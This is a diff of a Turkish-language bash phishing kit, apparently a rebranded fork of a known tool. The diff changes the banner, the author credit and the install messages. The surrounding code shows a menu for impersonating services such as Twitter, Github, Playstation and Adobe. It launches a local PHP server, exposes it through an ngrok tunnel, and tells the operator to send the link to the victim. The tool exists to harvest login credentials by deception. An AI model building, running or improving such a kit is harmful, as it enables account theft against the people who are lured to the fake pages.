@@ -1,22 +1,23 @@
 trap 'printf "\n";stop;exit 1' 2
 deps() {
-command -v php > /dev/null 2>&1 || { echo >&2 "PHP Kurulu Değil Lütfen Kurun ! Install it."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "Curl Kurulu Değil Lütfen Kurun ! Install it."; exit 1; }
-command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh Kurulu Değil Lütfen Kurun ! Install it"; exit 1; }
-command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip Kurulu Değil Lütfen Kurun! Install it"; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "PHP Kurulu Değil Lütfen Kurun ! pkg install php."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "Curl Kurulu Değil Lütfen Kurun ! pkg install curl."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh Kurulu Değil Lütfen Kurun ! pkg install openssh"; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip Kurulu Değil Lütfen Kurun! pkg install unzip"; exit 1; }
 }
 banner() {
 clear
-printf " \e[33;1m||||||||||||||||                   (::) P  \e[0m\n"
-printf " \e[33;1m||            ||/_/_/_/_/_/_/           H  \e[0m\n"
-printf " \e[33;1m||            ||         /O/        ||  İ  \e[0m\n"
-printf " \e[32;1m||   /\e[33;1m||        /Z/         ||  S  \e[0m\n"
-printf " \e[32;1m||            ||       /İ/          ||  H  \e[0m\n"
-printf " \e[32;1m||||||||||||||||     /16//_/_/_/_/_/|| E R \e[0m\n"
-printf " \e[33;1m [VARLIĞIM TÜRK VARLIĞINA ARMAĞAN OLSUN!]  \e[0m\n"
-printf " \e[33;1m                    \e[1;97m    Version 2.0      \e[0m\n"
+printf " \e[33;1m      >>>>>>>>>>>>>>>>    <<<<<<<<<<<<<<<<       #              \e[0m\n"
+printf " \e[33;1m     |       S        |                <|>     | ^ |            \e[0m\n"
+printf " \e[33;1m     |       T        |            <|>         | ^ |            \e[0m\n"
+printf " \e[32;1m     |       N        |         <|>            | ^ |            \e[0m\n"
+printf " \e[32;1m     |       M4       |     <|>                | ^ |            \e[0m\n"
+printf " \e[32;1m     >>>>>>>>>>>>>>>>    <<<<<<<<<<<<<<<<<     | ^ |            \e[0m\n"
+printf " \e[33;1m [☪ VARLIĞIM TÜRK VARLIĞINA ARMAĞAN OLSUN! ☪ ]  \e[0m\n"
+printf " \e[33;1m İletişim = İnstagram : @root.byyozzi            \e[0m\n"
+printf " \e[33;1m                    \e[1;97m    ☪ Oğuz TÜRK ☪      \e[0m\n"
 printf " \n"
-printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Cyber TÜRK Hacker SecreTOzi TARAFINDAN\e[0m\n"
+printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Cyber TÜRK SecreTNightmar4 TARAFINDAN! \e[0m\n"
 printf " \n"
 printf " \e[36;1m.:.Herhangi Bir Seçenek Belirleyin.:.\e[0m\n"
 printf " \n"
@@ -33,7 +34,7 @@ printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Twitter     \e[0m\e
 printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m Playstation \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;93m Reddit      \e[0m\e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;93m Vk\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Adobe       \e[0m\e[1;31m[\e[0m\e[1;77mx\e[0m\e[1;31m] \e[0m\e[1;93mExit\e[0m\n"
 printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m  Bir seçenek belirleyin: \e[0m\e[1;96m\en' option
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m  Bir Seçenek Belirleyin: \e[0m\e[1;96m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
 facebook
 elif [[ $option == 2 || $option == 02 ]]; then
@@ -342,7 +343,7 @@ sleep 2
 ./ngrok http 5555 > /dev/null 2>&1 &
 sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Bağlantıyı kurbana gönderin:\e[0m\e[1;93m %s \n" $link
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Bağlantıyı Kurbana Gönderin:\e[0m\e[1;93m %s \n" $link
 found
 }
 start_local(){
